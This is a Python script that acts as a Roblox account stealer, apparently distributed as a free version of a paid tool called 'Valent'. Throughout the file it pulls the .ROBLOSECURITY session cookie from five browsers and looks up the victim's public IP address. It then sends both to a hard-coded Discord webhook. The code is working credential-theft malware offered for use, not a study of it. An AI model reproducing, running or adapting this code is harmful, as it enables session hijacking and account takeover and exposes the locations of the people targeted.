import os
from discordwebhook import Discord
import requests
import browser_cookie3


webhook = "https://discord.com/api/webhooks/1094219389856907336/eNwY1-fRWU-0uEFVJRMHQWe-sgXG9ggCg9kMWe1ZgEtUGaqN8lV1FeSR3w5R9xcQM5il"

if __name__ == "__main__":
    ip = requests.get("https://api.ipify.org").text
    def Log():

        data = [] 

        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.chromium(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass

        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
    roblox = Log()

    if roblox == None:
        roblox = "No Roblox Cookie Found"





    discord = Discord(url=webhook)
    discord.post(
        username="BOT - Valent (FREE VERSION) 🍪",
        avatar_url="https://cdn.discordapp.com/attachments/1043258047042175089/1096508877459161138/NewLogo.png",
        embeds=[
            {
                "username": "BOT - Valent (FREE VERSION) 🍪",
                "title" : "Press Here To Buy Paid Version",
                "author": {
                "name": f"Audify Has Logged Someone!",
                "icon_url": "https://cdn.discordapp.com/attachments/1043258047042175089/1096508877459161138/NewLogo.png",
                },
                "url" : "https://discord.gg/EENfVYRTcW",
                "description" : f"",
                "color" : 16711680,
                "fields": [
                    {"name": "Roblox Cookie", "value": f"```{roblox}```", "inline": False},
                    {"name": "IP Address", "value": f"**`{ip}`**","inline": False},
                    

                ],
                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1043258047042175089/1096508877459161138/NewLogo.png"}


            },
            
            
        ],
    )